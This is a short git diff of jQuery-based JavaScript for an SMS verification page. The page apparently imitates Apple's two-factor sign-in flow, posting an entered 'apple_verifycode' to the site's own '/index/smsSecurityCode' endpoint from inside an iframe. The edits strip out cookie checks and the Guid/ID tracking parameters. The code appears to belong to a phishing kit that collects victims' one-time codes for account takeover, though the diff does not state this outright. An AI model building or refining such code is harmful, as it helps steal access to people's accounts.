@@ -1,7 +1,3 @@
-// 检查必要的cookie是否存在,如果不存在则重定向到首页
-if (!$.cookie('Guid') || !$.cookie('ID') || !$.cookie('Number')) {
-    window.location.href = '/index/signin';
-}
 
 // 将父窗口滚动到顶部
 $(window.parent.document).scrollTop(0);
@@ -48,12 +44,7 @@ $('#try-again').on('click', (e) => {
     diffPhone.addClass('hide');
 
 
-    fetchRequest('/index/resendCode',
-        'POST',
-        {
-            Guid: $.cookie('Guid'),
-        }
-    ).then(data  =>{
+    fetchRequest('/index/resendCode', 'POST').then(data  =>{
 
         if (data.data?.serviceErrors?.length > 0) {
             $errorMessage.removeClass('hide').text(data.data.serviceErrors[0].message);
@@ -142,11 +133,7 @@ function submitVerificationCode(smsCode) {
     verifyingCodeText.removeClass('hide');
     $liteThemeOverride.addClass('hide');
 
-    fetchRequest('/index/smsSecurityCode', 'POST', {
-        'Guid': $.cookie('Guid'),
-        'ID': $.cookie('ID'),
-        'apple_verifycode': smsCode,
-    }).then(data  =>{
+    fetchRequest('/index/smsSecurityCode', 'POST', {'apple_verifycode': smsCode}).then(data  =>{
 
         if (data && data.code === 200) {
             $('.landing__animation', window.parent.document).hide();
@@ -185,7 +172,7 @@ function handleVerificationError(error) {
 }
 
 function useDifferentPhoneNumber() {
-    fetchRequest('/index/useDifferentPhoneNumber?Guid=' + $.cookie('Guid'), 'Get').then(data  =>{
+    fetchRequest('/index/useDifferentPhoneNumber', 'Get').then(data  =>{
 
         if (data && data.code === 200) {
             return window.history.back();
